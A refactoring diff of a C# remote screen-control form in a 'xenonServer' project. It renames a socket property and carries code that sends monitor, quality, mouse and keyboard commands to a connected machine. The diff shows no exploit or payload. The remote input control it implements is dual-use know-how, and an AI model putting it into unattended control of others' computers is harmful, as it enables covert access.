@@ -87,16 +87,16 @@ namespace xenonServer.Forms
         }
         public async Task SetQuality(int quality) 
         {
-            await client.SendAsync(client.sock.Concat(new byte[] { 3 }, client.sock.IntToBytes(quality)));
+            await client.SendAsync(client.Sock.Concat(new byte[] { 3 }, client.Sock.IntToBytes(quality)));
         }
 
         public async Task SetMonitor(int monitorIndex)
         {
             monitor_index = monitorIndex;
-            await client.SendAsync(client.sock.Concat(new byte[] { 4 }, client.sock.IntToBytes(monitorIndex)));
+            await client.SendAsync(client.Sock.Concat(new byte[] { 4 }, client.Sock.IntToBytes(monitorIndex)));
             byte[] hwData = await client.ReceiveAsync();
-            int Width = client.sock.BytesToInt(hwData);
-            int Height = client.sock.BytesToInt(hwData,4);
+            int Width = client.Sock.BytesToInt(hwData);
+            int Height = client.Sock.BytesToInt(hwData,4);
             current_mon_size = new Size(Width, Height);
             UpdateScaleSize();
         }
@@ -105,7 +105,7 @@ namespace xenonServer.Forms
         {
             if (pictureBox1.Width > ((Size)current_mon_size).Width || pictureBox1.Height > ((Size)current_mon_size).Height)
             {
-                await client.SendAsync(client.sock.Concat(new byte[] { 13 }, client.sock.IntToBytes(10000)));
+                await client.SendAsync(client.Sock.Concat(new byte[] { 13 }, client.Sock.IntToBytes(10000)));
             }
             else
             {
@@ -113,7 +113,7 @@ namespace xenonServer.Forms
                 double heightRatio = (double)pictureBox1.Height / (double)((Size)current_mon_size).Height;
                 scaling_factor = Math.Max(widthRatio, heightRatio);
                 int factor = (int)(scaling_factor * 10000.0);
-                await client.SendAsync(client.sock.Concat(new byte[] { 13 }, client.sock.IntToBytes(factor)));
+                await client.SendAsync(client.Sock.Concat(new byte[] { 13 }, client.Sock.IntToBytes(factor)));
             }
         }
 
@@ -162,7 +162,7 @@ namespace xenonServer.Forms
             if (id != -1)
             {
                 await Utils.Type2returnAsync(SubSubNode);
-                byte[] a = SubSubNode.sock.IntToBytes(id);
+                byte[] a = SubSubNode.Sock.IntToBytes(id);
                 await client.SendAsync(a);
                 byte[] found = await client.ReceiveAsync();
                 if (found == null || found[0] == 0)
@@ -311,8 +311,8 @@ namespace xenonServer.Forms
             {
                 opcode = 10;
             }
-            byte[] payload = client.sock.Concat(new byte[] { opcode }, client.sock.IntToBytes(coords.X));
-            payload = client.sock.Concat(payload, client.sock.IntToBytes(coords.Y));
+            byte[] payload = client.Sock.Concat(new byte[] { opcode }, client.Sock.IntToBytes(coords.X));
+            payload = client.Sock.Concat(payload, client.Sock.IntToBytes(coords.Y));
             await client.SendAsync(payload);
 
         }
@@ -321,8 +321,8 @@ namespace xenonServer.Forms
         {
             if (current_mon_size==null|| pictureBox1.Image == null || !playing || e.Button == MouseButtons.Right || e.Button==MouseButtons.Middle || !checkBox1.Checked) return;
             Point coords = TranslateCoordinates(new Point(e.X, e.Y), (Size)current_mon_size, pictureBox1);
-            byte[] payload = client.sock.Concat(new byte[] { 6 }, client.sock.IntToBytes(coords.X));
-            payload = client.sock.Concat(payload, client.sock.IntToBytes(coords.Y));
+            byte[] payload = client.Sock.Concat(new byte[] { 6 }, client.Sock.IntToBytes(coords.X));
+            payload = client.Sock.Concat(payload, client.Sock.IntToBytes(coords.Y));
             await client.SendAsync(payload);
         }
 
@@ -331,8 +331,8 @@ namespace xenonServer.Forms
             //return;
             if (current_mon_size == null || pictureBox1.Image == null || !playing || e.Button==MouseButtons.Right || e.Button == MouseButtons.Middle || !checkBox1.Checked) return;
             Point coords = TranslateCoordinates(new Point(e.X, e.Y), (Size)current_mon_size, pictureBox1);
-            byte[] payload = client.sock.Concat(new byte[] { 7 }, client.sock.IntToBytes(coords.X));
-            payload = client.sock.Concat(payload, client.sock.IntToBytes(coords.Y));
+            byte[] payload = client.Sock.Concat(new byte[] { 7 }, client.Sock.IntToBytes(coords.X));
+            payload = client.Sock.Concat(payload, client.Sock.IntToBytes(coords.Y));
             await client.SendAsync(payload);
         }
 
@@ -341,8 +341,8 @@ namespace xenonServer.Forms
             if (current_mon_size == null || pictureBox1.Image == null || !playing || !checkBox1.Checked) return;
             //return;
             Point coords = TranslateCoordinates(new Point(e.X, e.Y), (Size)current_mon_size, pictureBox1);
-            byte[] payload = client.sock.Concat(new byte[] { 11 }, client.sock.IntToBytes(coords.X));
-            payload = client.sock.Concat(payload, client.sock.IntToBytes(coords.Y));
+            byte[] payload = client.Sock.Concat(new byte[] { 11 }, client.Sock.IntToBytes(coords.X));
+            payload = client.Sock.Concat(payload, client.Sock.IntToBytes(coords.Y));
             await client.SendAsync(payload);
         }
 
@@ -351,8 +351,8 @@ namespace xenonServer.Forms
             //return;
             if (current_mon_size == null || pictureBox1.Image == null || !playing || e.Button == MouseButtons.Right || e.Button == MouseButtons.Middle || !checkBox1.Checked) return;
             Point coords = TranslateCoordinates(new Point(e.X, e.Y), (Size)current_mon_size, pictureBox1);
-            byte[] payload = client.sock.Concat(new byte[] { 8 }, client.sock.IntToBytes(coords.X));
-            payload = client.sock.Concat(payload, client.sock.IntToBytes(coords.Y));
+            byte[] payload = client.Sock.Concat(new byte[] { 8 }, client.Sock.IntToBytes(coords.X));
+            payload = client.Sock.Concat(payload, client.Sock.IntToBytes(coords.Y));
             await client.SendAsync(payload);
         }
 
@@ -379,7 +379,7 @@ namespace xenonServer.Forms
         private async void ScreenControl_KeyUp(object sender, KeyEventArgs e)
         {
             if (current_mon_size == null || pictureBox1.Image == null || !playing || !checkBox1.Checked) return;
-            await client.SendAsync(client.sock.Concat(new byte[] { 12 }, client.sock.IntToBytes(e.KeyValue)));
+            await client.SendAsync(client.Sock.Concat(new byte[] { 12 }, client.Sock.IntToBytes(e.KeyValue)));
         }
 
         private void checkBox1_CheckedChanged(object sender, EventArgs e)
